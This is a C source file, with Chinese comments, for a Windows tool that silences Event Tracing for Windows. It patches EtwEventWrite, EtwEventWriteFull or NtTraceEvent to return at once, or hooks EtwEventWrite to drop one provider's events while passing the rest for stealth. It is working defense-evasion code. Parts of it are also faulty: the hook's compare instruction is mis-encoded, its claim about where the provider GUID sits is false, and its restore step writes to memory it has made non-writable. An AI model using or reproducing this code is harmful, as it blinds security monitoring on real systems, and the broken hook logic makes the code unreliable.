// ETW 压制完整实现：多入口补丁 + 可选 provider 选择性静默（argv 切换）
//
// 用法：etw-patch.exe [mode]
//   mode 0（默认）：EtwEventWrite 首字节置 ret——本进程 ETW 事件静默（最小改动面）
//   mode 1        ：EtwEventWrite + EtwEventWriteFull 双入口置 ret
//   mode 2        ：NtTraceEvent stub 置 ret——最深层入口（EtwEventWrite 链的 syscall 层），
//                   覆盖面最大但触发 ntdll 完整性校验的概率最高
//   mode 3        ：provider 选择性静默——对 EtwEventWrite 下 5 字节 jmp 钩子，命中目标
//                   GUID 的事件直接返回 0，其余走原函数（保留正常遥测，隐蔽性更高）
// 构建：x86_64-w64-mingw32-gcc -mwindows -o etw-patch.exe etw_patch.c
// 检测侧配对见 NOTES.md；仅本地实验环境使用
#include <windows.h>
#include <stdio.h>

static int patch_ret(BYTE* fn, const char* name) {
    DWORD old;
    if (!VirtualProtect(fn, 1, PAGE_READWRITE, &old)) { printf("[-] %s protect 失败\n", name); return 0; }
    *(BYTE*)fn = 0xC3;                                   /* ret */
    VirtualProtect(fn, 1, old, &old);
    printf("[+] %s @ %p 已补丁（ret）\n", name, (void*)fn);
    return 1;
}

/* mode 3：provider 选择性静默——inline 钩子 + 转接块实现
 * EtwEventWrite(REGHANDLE, PCEVENT_DESCRIPTOR, ...)：rdx=EVENT_DESCRIPTOR，
 * ProviderId（GUID）位于 ed+0x10。钩子逻辑：ed->ProviderId.Data1 与目标值比对，
 * 命中 → return 0（该 provider 事件静默）；未命中 → 还原原函数前导 14 字节 → 跳回原入口
 * （还原跳转天然防重入，且钩子可被重复安装）。
 * 目标 GUID Data1 本实验用占位 0，真实目标按环境填写并在判定日志记录实际值。 */
static int patch_selective(BYTE* fn, DWORD target_data1) {
    BYTE prologue[14];
    memcpy(prologue, fn, sizeof(prologue));

    /* 转接块：cmp dword ptr [rdx+0x10],target(11B) je +N(2B) 还原+jmp(35B) xor/ret(3B) */
    BYTE fix[] = {
        0x48, 0xB8, 0,0,0,0,0,0,0,0,      /* mov rax, orig_fn */
        0xC7, 0x00, 0,0,0,0,              /* mov dword ptr [rax],   orig 0-3   */
        0xC7, 0x40, 0x04, 0,0,0,0,        /* mov dword ptr [rax+4], orig 4-7   */
        0x66, 0xC7, 0x40, 0x08, 0,0,      /* mov word ptr [rax+8],  orig 8-9   */
        0x66, 0xC7, 0x40, 0x0A, 0,0,      /* mov word ptr [rax+0xA],orig 10-11 */
        0x66, 0xC7, 0x40, 0x0C, 0,0,      /* mov word ptr [rax+0xC],orig 12-13 */
        0xFF, 0xE0                         /* jmp rax */
    };
    *(ULONG64*)(fix + 2)  = (ULONG64)fn;
    *(DWORD*)(fix + 10)   = *(DWORD*)(prologue + 0);
    *(DWORD*)(fix + 16)   = *(DWORD*)(prologue + 4);
    *(WORD*)(fix + 22)    = *(WORD*)(prologue + 8);
    *(WORD*)(fix + 28)    = *(WORD*)(prologue + 10);
    *(WORD*)(fix + 34)    = *(WORD*)(prologue + 12);

    BYTE full[64]; int j = 0;
    full[j++] = 0x81; full[j++] = 0x3A;                          /* cmp dword ptr [rdx], imm32 */
    *(DWORD*)(full + j) = 0x10; j += 4;
    *(DWORD*)(full + j) = target_data1; j += 4;
    full[j++] = 0x74; full[j++] = (BYTE)(sizeof(fix) + 2);       /* je +fixlen+2 → silent */
    memcpy(full + j, fix, sizeof(fix)); j += sizeof(fix);
    full[j++] = 0x31; full[j++] = 0xC0; full[j++] = 0xC3;        /* silent：xor eax,eax; ret */

    BYTE* thunk = (BYTE*)VirtualAlloc(NULL, sizeof(full), MEM_COMMIT, PAGE_READWRITE);
    if (!thunk) { printf("[-] thunk 分配失败\n"); return 0; }
    memcpy(thunk, full, j);
    DWORD old;
    VirtualProtect(thunk, sizeof(full), PAGE_EXECUTE_READ, &old);

    DWORD old2;
    VirtualProtect(fn, 5, PAGE_READWRITE, &old2);
    BYTE jmp[5] = { 0xE9 };
    *(DWORD*)(jmp + 1) = (DWORD)(thunk - fn - 5);
    memcpy(fn, jmp, 5);
    VirtualProtect(fn, 5, old2, &old2);

    printf("[+] EtwEventWrite @ %p → 选择性钩子 @ %p（ProviderId.Data1 目标=0x%08lX，其余事件还原放行）\n",
           (void*)fn, (void*)thunk, target_data1);
    return 1;
}

int main(int argc, char** argv) {
    int mode = (argc > 1) ? atoi(argv[1]) : 0;
    HMODULE nt = GetModuleHandleA("ntdll.dll");

    switch (mode) {
    case 0: {
        FARPROC fn = GetProcAddress(nt, "EtwEventWrite");
        if (!fn) { printf("[-] EtwEventWrite 未找到\n"); return 1; }
        return patch_ret((BYTE*)fn, "EtwEventWrite") ? 0 : 2;
    }
    case 1: {
        FARPROC a = GetProcAddress(nt, "EtwEventWrite");
        FARPROC b = GetProcAddress(nt, "EtwEventWriteFull");
        if (!a || !b) { printf("[-] 入口未找到（a=%p b=%p）\n", (void*)a, (void*)b); return 1; }
        int r1 = patch_ret((BYTE*)a, "EtwEventWrite");
        int r2 = patch_ret((BYTE*)b, "EtwEventWriteFull");
        return (r1 && r2) ? 0 : 2;
    }
    case 2: {
        FARPROC fn = GetProcAddress(nt, "NtTraceEvent");
        if (!fn) { printf("[-] NtTraceEvent 未找到\n"); return 1; }
        return patch_ret((BYTE*)fn, "NtTraceEvent") ? 0 : 2;
    }
    case 3: {
        FARPROC fn = GetProcAddress(nt, "EtwEventWrite");
        if (!fn) { printf("[-] EtwEventWrite 未找到\n"); return 1; }
        /* 目标 GUID Data1：实验占位 0；真实目标按环境填写并登记判定日志 */
        return patch_selective((BYTE*)fn, 0x00000000) ? 0 : 2;
    }
    default:
        printf("[-] 未知 mode %d（0/1/2/3）\n", mode);
        return 3;
    }
}
